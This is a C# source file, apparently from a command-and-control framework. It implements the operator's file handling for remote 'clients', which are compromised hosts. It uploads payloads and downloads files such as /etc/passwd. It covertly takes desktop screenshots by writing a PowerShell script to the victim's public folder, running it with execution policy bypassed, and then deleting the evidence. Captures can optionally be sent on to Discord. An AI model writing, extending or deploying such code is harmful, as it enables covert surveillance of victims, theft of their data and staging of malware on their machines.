using C2Framework;
using System.Text;

public class C2FileManager
{
    private readonly C2Server _server;
    private FileTransferManager _fileTransferManager;
    private DateTime _downloadStartTime = DateTime.MinValue;
    private DateTime _lastSpeedUpdateTime = DateTime.MinValue;
    private long _lastBytesTransferred = 0;
    private long _expectedFileSize = 0;
    private int _lastReportedPercentage = -1;

    public C2FileManager(C2Server server)
    {
        _server = server;
        InitializeFileTransferManager();
    }

    private void InitializeFileTransferManager()
    {
        try
        {
            _fileTransferManager = new FileTransferManager(_server);
            _fileTransferManager.OutputMessage += (sender, e) =>
            {
                _server.SafeRaiseOutputMessage(e.Message, e.Color);
            };
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Failed to initialize file transfer manager: {ex.Message}", ex);
        }
    }

    public async Task DownloadFile(ClientHandler activeClient, string remotePath, string downloadPath = null)
    {
        await _fileTransferManager.DownloadFile(activeClient, remotePath, downloadPath);
    }

    public async Task DownloadFileWithTCP(ClientHandler activeClient, string remotePath, string downloadPath = null, Action<int> progressCallback = null)
    {
        await _fileTransferManager.DownloadFileWithTCP(activeClient, remotePath, downloadPath, progressCallback);
    }

    public async Task UploadFileWithProgress(ClientHandler activeClient, string localPath, string remotePath, Action<int> progressCallback)
    {
        await _fileTransferManager.UploadFileWithProgress(activeClient, localPath, remotePath, progressCallback);
    }

    public async Task CaptureScreenshot(ClientHandler activeClient, string downloadPath, bool sendToDiscord = false)
    {
        if (activeClient == null)
        {
            _server.RaiseOutputMessage("[!] No active session. Use 'connect <id>' to select a session.", Color.Red);
            return;
        }

        if (activeClient.IsLinux)
        {
            _server.RaiseOutputMessage("[!] Linux Screenshot is not supported :(", Color.Red);
            return;
        }

        if (activeClient.UserName.Contains("SYSTEM", StringComparison.OrdinalIgnoreCase) ||
            activeClient.UserName.Contains("NT AUTHORITY", StringComparison.OrdinalIgnoreCase) ||
            activeClient.UserName.EndsWith("$", StringComparison.OrdinalIgnoreCase))
        {
            _server.RaiseOutputMessage("[!] FOR REAL!!! Screenshots are not available for SYSTEM accounts - no access to user desktop session", Color.Red);
            return;
        }

        _server.RaiseOutputMessage("[*] Taking screenshot...", Color.Yellow);

        try
        {
            if (activeClient.IsEncrypted)
            {
                await CaptureScreenshotEncrypted(activeClient, downloadPath ?? GetC2DownloadDirectory(), sendToDiscord);
            }
            else
            {
                await CaptureScreenshotPlainText(activeClient, downloadPath ?? GetC2DownloadDirectory(), sendToDiscord);
            }
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error capturing screenshot: {ex.Message}", Color.Red);
        }
    }

    private async Task CaptureScreenshotEncrypted(ClientHandler activeClient, string downloadPath, bool sendToDiscord = false)
    {
        string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
        string tempRemotePath = $"%PUBLIC%\\screenshot_{timestamp}.png";
        string psScript = $"%PUBLIC%\\ss_{timestamp}.ps1";

        activeClient.SendCommand($"echo try {{ > {psScript}");
        activeClient.SendCommand($"echo     Add-Type -AssemblyName System.Windows.Forms,System.Drawing >> {psScript}");
        activeClient.SendCommand($"echo     $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds >> {psScript}");
        activeClient.SendCommand($"echo     $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height >> {psScript}");
        activeClient.SendCommand($"echo     $graphics = [System.Drawing.Graphics]::FromImage($bitmap) >> {psScript}");
        activeClient.SendCommand($"echo     $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size) >> {psScript}");
        activeClient.SendCommand($"echo     $path = $env:PUBLIC + '\\screenshot_{timestamp}.png' >> {psScript}");
        activeClient.SendCommand($"echo     $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png) >> {psScript}");
        activeClient.SendCommand($"echo     $graphics.Dispose() >> {psScript}");
        activeClient.SendCommand($"echo     $bitmap.Dispose() >> {psScript}");
        activeClient.SendCommand($"echo     if (Test-Path $path) {{ >> {psScript}");
        activeClient.SendCommand($"echo         Write-Output $path >> {psScript}");
        activeClient.SendCommand($"echo     }} else {{ >> {psScript}");
        activeClient.SendCommand($"echo         Write-Output 'FILE_NOT_CREATED' >> {psScript}");
        activeClient.SendCommand($"echo     }} >> {psScript}");
        activeClient.SendCommand($"echo }} catch {{ >> {psScript}");
        activeClient.SendCommand($"echo     Write-Output \"SCREENSHOT_ERROR: $($_.Exception.Message)\" >> {psScript}");
        activeClient.SendCommand($"echo     # Try alternative method for service/RDP contexts >> {psScript}");
        activeClient.SendCommand($"echo     try {{ >> {psScript}");
        activeClient.SendCommand($"echo         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen >> {psScript}");
        activeClient.SendCommand($"echo         $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height >> {psScript}");
        activeClient.SendCommand($"echo         $g = [System.Drawing.Graphics]::FromImage($bmp) >> {psScript}");
        activeClient.SendCommand($"echo         $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size) >> {psScript}");
        activeClient.SendCommand($"echo         $altPath = $env:PUBLIC + '\\screenshot_{timestamp}_alt.png' >> {psScript}");
        activeClient.SendCommand($"echo         $bmp.Save($altPath, [System.Drawing.Imaging.ImageFormat]::Png) >> {psScript}");
        activeClient.SendCommand($"echo         $g.Dispose() >> {psScript}");
        activeClient.SendCommand($"echo         $bmp.Dispose() >> {psScript}");
        activeClient.SendCommand($"echo         if (Test-Path $altPath) {{ >> {psScript}");
        activeClient.SendCommand($"echo             Write-Output $altPath >> {psScript}");
        activeClient.SendCommand($"echo         }} else {{ >> {psScript}");
        activeClient.SendCommand($"echo             Write-Output 'ALT_METHOD_FAILED' >> {psScript}");
        activeClient.SendCommand($"echo         }} >> {psScript}");
        activeClient.SendCommand($"echo     }} catch {{ >> {psScript}");
        activeClient.SendCommand($"echo         Write-Output \"ALT_ERROR: $($_.Exception.Message)\" >> {psScript}");
        activeClient.SendCommand($"echo     }} >> {psScript}");
        activeClient.SendCommand($"echo }} >> {psScript}");

        // Execute the script
        activeClient.SendCommand($"powershell -ExecutionPolicy Bypass -File {psScript}");

        await Task.Delay(6000);

        // Get the response and parse results
        string response = activeClient.GetLastResponse();
        string actualPath = null;
        bool screenshotFailed = false;

        if (response != null)
        {
            string[] lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string line in lines)
            {
                string trimmedLine = line.Trim();

                if (trimmedLine.EndsWith(".png", StringComparison.OrdinalIgnoreCase))
                {
                    actualPath = trimmedLine;
                    break;
                }
                else if (trimmedLine.Contains("SCREENSHOT_ERROR") ||
                         trimmedLine.Contains("FILE_NOT_CREATED") ||
                         trimmedLine.Contains("ALT_METHOD_FAILED"))
                {
                    _server.RaiseOutputMessage($"[!] Screenshot failed: {trimmedLine}", Color.Red);
                    screenshotFailed = true;
                }
            }
        }

        if (!screenshotFailed && !string.IsNullOrEmpty(actualPath))
        {
            await DownloadFile(activeClient, actualPath, downloadPath);

            if (sendToDiscord)
            {
                await SendScreenshotToDiscord(activeClient, actualPath, downloadPath, timestamp);
            }
        }
        else
        {
            _server.RaiseOutputMessage("[!] Screenshot capture failed - no desktop session available", Color.Red);
            _server.RaiseOutputMessage("[*] This usually happens when user is not logged in interactively", Color.Yellow);
        }

        // Clean up
        activeClient.SendCommand($"del {psScript} 2>nul");
        if (!string.IsNullOrEmpty(actualPath))
        {
            activeClient.SendCommand($"del \"{actualPath}\" 2>nul");
        }
    }

    private async Task CaptureScreenshotPlainText(ClientHandler activeClient, string downloadPath, bool sendToDiscord = false)
    {
        string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
        string fileName = $"screenshot_{timestamp}.png";

        string psCommand = $@"
try {{
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
    $path = Join-Path $env:PUBLIC '{fileName}'
    $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    if (Test-Path $path) {{
        Write-Output $path
    }} else {{
        Write-Output 'FILE_NOT_CREATED'
    }}
}} catch {{
    Write-Output ""SCREENSHOT_ERROR: $($_.Exception.Message)""
    
    # Try alternative method
    try {{
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $altPath = Join-Path $env:PUBLIC 'screenshot_{timestamp}_alt.png'
        $bmp.Save($altPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $g.Dispose()
        $bmp.Dispose()
        
        if (Test-Path $altPath) {{
            Write-Output $altPath
        }} else {{
            Write-Output 'ALT_METHOD_FAILED'
        }}
    }} catch {{
        Write-Output ""ALT_ERROR: $($_.Exception.Message)""
    }}
}}
";

        activeClient.SendCommand(psCommand);

        await Task.Delay(6000);

        // Parse response to get screenshot path
        string response = activeClient.GetLastResponse();
        string screenshotPath = null;
        bool screenshotFailed = false;

        if (response != null)
        {
            var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            foreach (string line in lines)
            {
                string trimmedLine = line.Trim();

                if (trimmedLine.EndsWith(".png", StringComparison.OrdinalIgnoreCase) &&
                    !trimmedLine.StartsWith("PS ") &&
                    !trimmedLine.Contains("Screenshot saved:"))
                {
                    screenshotPath = trimmedLine;
                    break;
                }
                else if (trimmedLine.Contains("SCREENSHOT_ERROR") ||
                         trimmedLine.Contains("FILE_NOT_CREATED") ||
                         trimmedLine.Contains("ALT_METHOD_FAILED"))
                {
                    _server.RaiseOutputMessage($"[!] Screenshot failed: {trimmedLine}", Color.Red);
                    screenshotFailed = true;
                }
            }
        }

        if (!screenshotFailed && !string.IsNullOrEmpty(screenshotPath))
        {
            await DownloadFile(activeClient, screenshotPath, downloadPath);

            if (sendToDiscord)
            {
                await SendScreenshotToDiscord(activeClient, screenshotPath, downloadPath, timestamp);
            }
        }
        else
        {
            _server.RaiseOutputMessage("[!] Screenshot capture failed - no desktop session available", Color.Red);
            _server.RaiseOutputMessage("[*] This usually happens when user is not logged in interactively", Color.Yellow);
        }

        // Clean up
        string cleanupCmd = $"Remove-Item -Path '{screenshotPath}' -Force -ErrorAction SilentlyContinue 2>$null";
        activeClient.SendCommand(cleanupCmd);
    }

    private async Task SendScreenshotToDiscord(ClientHandler activeClient, string remotePath, string downloadPath, string timestamp)
    {
        try
        {
            // Build the local file path
            string fileName = $"screenshot_{activeClient.ClientId}_{timestamp}.png";
            string localFilePath = Path.Combine(downloadPath, fileName);

            // Wait a moment for file to be fully written
            await Task.Delay(1000);

            // Check if file exists locally
            if (File.Exists(localFilePath))
            {
                var fileInfo = new FileInfo(localFilePath);

                // Get Discord manager and send screenshot
                var discordManager = _server.GetDiscordManager();
                if (discordManager != null && discordManager.IsEnabled)
                {
                    await discordManager.SendScreenshotToDiscord(activeClient.ClientId, localFilePath, fileInfo.Length);
                }
            }
            else
            {
                // Try alternative filename patterns
                string[] possibleFiles = Directory.GetFiles(downloadPath, $"*screenshot*{timestamp}*.png");
                if (possibleFiles.Length > 0)
                {
                    string foundFile = possibleFiles.OrderByDescending(f => new FileInfo(f).CreationTime).First();
                    var fileInfo = new FileInfo(foundFile);

                    var discordManager = _server.GetDiscordManager();
                    if (discordManager != null && discordManager.IsEnabled)
                    {
                        await discordManager.SendScreenshotToDiscord(activeClient.ClientId, foundFile, fileInfo.Length);
                    }
                }
            }
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error sending screenshot to Discord: {ex.Message}", Color.Red);
        }
    }
    public string GetC2DownloadDirectory()
    {
        return _fileTransferManager.GetC2DownloadDirectory();
    }

    // File transfer progress tracking methods
    public void UpdateDownloadProgress(long bytesTransferred, long totalBytes)
    {
        try
        {
            if (_downloadStartTime == DateTime.MinValue)
            {
                _downloadStartTime = DateTime.Now;
                _lastSpeedUpdateTime = DateTime.Now;
                _expectedFileSize = totalBytes;
                _lastBytesTransferred = 0;
                _lastReportedPercentage = -1;
            }

            double percentage = totalBytes > 0 ? (double)bytesTransferred / totalBytes * 100 : 0;
            int currentPercentage = (int)Math.Floor(percentage);

            // Only update every 5% or every 2 seconds to avoid spam
            TimeSpan timeSinceLastUpdate = DateTime.Now - _lastSpeedUpdateTime;
            bool shouldUpdate = currentPercentage != _lastReportedPercentage &&
                              (currentPercentage % 5 == 0 || timeSinceLastUpdate.TotalSeconds >= 2);

            if (shouldUpdate || bytesTransferred == totalBytes)
            {
                TimeSpan elapsed = DateTime.Now - _downloadStartTime;
                double speedBps = elapsed.TotalSeconds > 0 ? bytesTransferred / elapsed.TotalSeconds : 0;

                string speedText = FormatSpeed(speedBps);
                string sizeText = $"{FormatFileSize(bytesTransferred)}/{FormatFileSize(totalBytes)}";

                if (bytesTransferred == totalBytes)
                {
                    _server.RaiseOutputMessage($"[+] Download completed: {sizeText} in {elapsed:mm\\:ss} ({speedText})", Color.Green);
                    ResetDownloadProgress();
                }
                else
                {
                    TimeSpan eta = speedBps > 0 ? TimeSpan.FromSeconds((totalBytes - bytesTransferred) / speedBps) : TimeSpan.Zero;
                    string etaText = eta.TotalHours >= 1 ? eta.ToString(@"hh\:mm\:ss") : eta.ToString(@"mm\:ss");

                    _server.RaiseOutputMessage($"[*] Downloading: {currentPercentage:F0}% ({sizeText}) - {speedText} - ETA: {etaText}", Color.Cyan);
                }

                _lastReportedPercentage = currentPercentage;
                _lastSpeedUpdateTime = DateTime.Now;
                _lastBytesTransferred = bytesTransferred;
            }
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error updating download progress: {ex.Message}", Color.Red);
        }
    }

    private void ResetDownloadProgress()
    {
        _downloadStartTime = DateTime.MinValue;
        _lastSpeedUpdateTime = DateTime.MinValue;
        _lastBytesTransferred = 0;
        _expectedFileSize = 0;
        _lastReportedPercentage = -1;
    }

    private string FormatSpeed(double bytesPerSecond)
    {
        if (bytesPerSecond >= 1024 * 1024 * 1024)
            return $"{bytesPerSecond / (1024 * 1024 * 1024):F1} GB/s";
        else if (bytesPerSecond >= 1024 * 1024)
            return $"{bytesPerSecond / (1024 * 1024):F1} MB/s";
        else if (bytesPerSecond >= 1024)
            return $"{bytesPerSecond / 1024:F1} KB/s";
        else
            return $"{bytesPerSecond:F0} B/s";
    }

    private string FormatFileSize(long bytes)
    {
        if (bytes >= 1024 * 1024 * 1024)
            return $"{bytes / (1024.0 * 1024.0 * 1024.0):F1} GB";
        else if (bytes >= 1024 * 1024)
            return $"{bytes / (1024.0 * 1024.0):F1} MB";
        else if (bytes >= 1024)
            return $"{bytes / 1024.0:F1} KB";
        else
            return $"{bytes} B";
    }

    // File validation methods
    public bool ValidateFilePath(string path)
    {
        if (string.IsNullOrWhiteSpace(path))
            return false;

        try
        {
            // Check for invalid characters
            char[] invalidChars = Path.GetInvalidPathChars();
            if (path.Any(c => invalidChars.Contains(c)))
                return false;

            // Check path length
            if (path.Length > 260) // MAX_PATH on Windows
                return false;

            return true;
        }
        catch
        {
            return false;
        }
    }

    public string SanitizeFileName(string fileName)
    {
        if (string.IsNullOrWhiteSpace(fileName))
            return "unnamed_file";

        // Remove invalid characters
        char[] invalidChars = Path.GetInvalidFileNameChars();
        string sanitized = new string(fileName.Where(c => !invalidChars.Contains(c)).ToArray());

        // Ensure not empty after sanitization
        if (string.IsNullOrWhiteSpace(sanitized))
            sanitized = "unnamed_file";

        // Limit length
        if (sanitized.Length > 100)
            sanitized = sanitized.Substring(0, 100);

        return sanitized;
    }

    // Directory management methods
    public string EnsureDownloadDirectory()
    {
        try
        {
            string downloadDir = GetC2DownloadDirectory();
            if (!Directory.Exists(downloadDir))
            {
                Directory.CreateDirectory(downloadDir);
                _server.RaiseOutputMessage($"[+] Created download directory: {downloadDir}", Color.Green);
            }
            return downloadDir;
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Error creating download directory: {ex.Message}", Color.Red);
            // Fallback to current directory
            return Environment.CurrentDirectory;
        }
    }

    public void ShowFileOperationHelp()
    {
        StringBuilder help = new StringBuilder();
        help.AppendLine("\n=== File Operations Help ===");
        help.AppendLine("");
        help.AppendLine("Download Commands:");
        help.AppendLine("  download <remote_path> [local_path]");
        help.AppendLine("  Example: download C:\\temp\\file.txt");
        help.AppendLine("  Example: download /etc/passwd ./passwd.txt");
        help.AppendLine("");
        help.AppendLine("Upload Commands:");
        help.AppendLine("  upload <local_path> <remote_path>");
        help.AppendLine("  Example: upload ./payload.exe C:\\temp\\payload.exe");
        help.AppendLine("  Example: upload ./script.sh /tmp/script.sh");
        help.AppendLine("");
        help.AppendLine("Screenshot Commands:");
        help.AppendLine("  screenshot [download_path]");
        help.AppendLine("  Example: screenshot");
        help.AppendLine("  Example: screenshot ./screenshots/");
        help.AppendLine("");
        help.AppendLine("Notes:");
        help.AppendLine("  - Files are downloaded to: " + GetC2DownloadDirectory());
        help.AppendLine("  - Large files show progress indicators");
        help.AppendLine("  - Screenshots only work on Windows clients");
        help.AppendLine("  - SYSTEM accounts cannot take screenshots");
        help.AppendLine("");

        _server.RaiseOutputMessage(help.ToString(), Color.Cyan);
    }

    // Utility methods for file operations
    public async Task<bool> FileExistsOnClient(ClientHandler client, string remotePath)
    {
        if (client == null || string.IsNullOrEmpty(remotePath))
            return false;

        try
        {
            string command = client.IsLinux ?
                $"test -f \"{remotePath}\" && echo \"EXISTS\" || echo \"NOT_FOUND\"" :
                $"if exist \"{remotePath}\" (echo EXISTS) else (echo NOT_FOUND)";

            client.SendCommand(command);
            await Task.Delay(2000);

            string response = client.GetLastResponse();
            return response != null && response.Contains("EXISTS");
        }
        catch
        {
            return false;
        }
    }

    public async Task<long> GetRemoteFileSize(ClientHandler client, string remotePath)
    {
        if (client == null || string.IsNullOrEmpty(remotePath))
            return -1;

        try
        {
            string command = client.IsLinux ?
                $"stat -c%s \"{remotePath}\" 2>/dev/null || echo \"-1\"" :
                $"powershell -Command \"(Get-Item '{remotePath}').Length\" 2>$null";

            client.SendCommand(command);
            await Task.Delay(2000);

            string response = client.GetLastResponse();
            if (!string.IsNullOrEmpty(response))
            {
                var lines = response.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines)
                {
                    if (long.TryParse(line.Trim(), out long size))
                    {
                        return size;
                    }
                }
            }

            return -1;
        }
        catch
        {
            return -1;
        }
    }

    public string GenerateUniqueFileName(string directory, string baseFileName)
    {
        if (!File.Exists(Path.Combine(directory, baseFileName)))
            return baseFileName;

        string nameWithoutExt = Path.GetFileNameWithoutExtension(baseFileName);
        string extension = Path.GetExtension(baseFileName);
        int counter = 1;

        string newFileName;
        do
        {
            newFileName = $"{nameWithoutExt}_{counter}{extension}";
            counter++;
        }
        while (File.Exists(Path.Combine(directory, newFileName)) && counter < 1000);

        return newFileName;
    }

    // Clean up temporary files
    public void CleanupTempFiles()
    {
        try
        {
            string tempDir = Path.GetTempPath();
            string[] tempFiles = Directory.GetFiles(tempDir, "c2_temp_*");

            foreach (string file in tempFiles)
            {
                try
                {
                    File.Delete(file);
                }
                catch
                {
                    // Ignore individual file cleanup errors
                }
            }
        }
        catch (Exception ex)
        {
            _server.RaiseOutputMessage($"[!] Warning: Could not clean up temp files: {ex.Message}", Color.Yellow);
        }
    }
}